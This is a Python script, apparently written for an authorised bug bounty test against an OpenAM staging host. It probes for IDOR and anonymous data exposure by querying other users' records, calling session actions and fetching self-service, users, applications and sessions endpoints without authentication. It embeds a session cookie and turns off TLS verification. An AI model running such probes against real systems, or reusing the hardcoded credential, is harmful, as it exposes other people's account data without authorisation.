# -*- coding: utf-8 -*-
"""AIC 第七轮:数据查询边界(自己 vs 他人)+ sessions POST + 匿名 kba 复核
预期结果表:
  成立 -> 查自己返回完整资料;查他人返回空/403;匿名 kba 403/404
  不成立(发现) -> 查他人可返回数据(IDOR);匿名可读 kba/敏感配置
"""
import requests, urllib3, json
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
COOKIE = 'amlbcookie=01; aa942d46ece12ce=IFE9DsM4gWKUGQHkQczCcFOQc8Q.*AAJTSQACMDIAAlNLABxpYlZOOXByMGZQRGNycDhwTGxXS21iZGxDSjA9AAR0eXBlAANDVFMAAlMxAAIwMQ..*'

def new_s(anon=False):
    S = requests.Session()
    S.trust_env = False
    S.proxies = {'http': None, 'https': None}
    H = {'User-Agent': 'research-1643', 'Accept-API-Version': 'resource=1.0, protocol=1.0'}
    if not anon:
        H['Cookie'] = COOKIE
    S.headers.update(H)
    return S

S = new_s()

print('=== 1. POST idFromSession(拿自己 id) ===')
r = S.post(BASE + '/am/json/realms/alpha/users?_action=idFromSession', timeout=12, verify=False)
print('%d %s' % (r.status_code, r.text[:200]))

print('\n=== 2. 查询边界:自己 vs 他人 ===')
q_self = '_queryFilter=mail+eq+%221643584176%40qq.com%22'
q_other = '_queryFilter=mail+eq+%221643584176%40wearehackerone.com%22'
q_other2 = '_queryFilter=userName+eq+%22researcher1643%22'
for q in [q_self, q_other, q_other2]:
    r = S.get(BASE + '/am/json/realms/alpha/users?' + q, timeout=12, verify=False)
    print('%-70s -> %d %s' % (q, r.status_code, r.text[:300].replace('\n', ' ')))

print('\n=== 3. sessions POST ===')
for action in ['getSessionInfo', 'logout']:
    r = S.post(BASE + '/am/json/realms/alpha/sessions?_action=' + action, timeout=12, verify=False)
    print('%-20s -> %d %s' % (action, r.status_code, r.text[:200].replace('\n', ' ')))

print('\n=== 4. 匿名复核 kba / 其他 selfservice ===')
S2 = new_s(anon=True)
for p in ['/am/json/realms/alpha/selfservice/kba',
          '/am/json/realms/alpha/selfservice',
          '/am/json/realms/alpha/selfservice/registration',
          '/am/json/realms/alpha/users?_queryFilter=true',
          '/am/json/realms/alpha/applications?_queryFilter=true',
          '/am/json/realms/alpha/sessions?_queryFilter=true']:
    r = S2.get(BASE + p, timeout=12, verify=False)
    print('%-75s -> %d %s' % (p, r.status_code, r.text[:150].replace('\n', ' ')))
